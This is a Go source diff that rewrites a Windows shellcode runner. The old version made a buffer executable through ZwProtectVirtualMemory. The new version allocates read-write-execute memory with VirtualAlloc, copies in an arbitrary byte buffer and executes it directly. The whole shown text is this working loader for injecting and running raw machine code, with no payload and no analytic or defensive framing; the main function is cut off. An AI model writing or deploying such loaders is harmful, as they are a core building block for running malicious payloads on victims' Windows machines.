@@ -1,5 +1,4 @@
 // +build windows
-// +build 386
 package main
 
 import (
@@ -10,23 +9,26 @@ import (
 )
 
 const (
-	PAGE_EXECUTE uintptr = 0x10
+	MEM_COMMIT             uintptr = 0x1000
+	PAGE_EXECUTE_READWRITE uintptr = 0x40
 )
 
-func RUN(buf []byte) {
-	var hProcess uintptr = 0
-	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
-	var dwBufferLen = uint(len(buf))
-	var dwOldPerm uint32
+func memcpy(base uintptr, buf []byte) {
+	for i := 0; i < len(buf); i++ {
+		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
+	}
+}
 
-	syscall.NewLazyDLL("ntdll").NewProc("ZwProtectVirtualMemory").Call(
-		hProcess-1,
-		uintptr(unsafe.Pointer(&pBaseAddr)),
-		uintptr(unsafe.Pointer(&dwBufferLen)),
-		PAGE_EXECUTE,
-		uintptr(unsafe.Pointer(&dwOldPerm)),
-	)
-	syscall.Syscall(uintptr(unsafe.Pointer(&buf[0])), 0, 0, 0, 0)
+func RUN(buf []byte) {
+	addr, _, err := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc").Call(0,
+		uintptr(len(buf)),
+		MEM_COMMIT,
+		PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		log.Fatal(err)
+	}
+	memcpy(addr, buf)
+	syscall.Syscall(addr, 0, 0, 0, 0)
 }
 
 func main() {
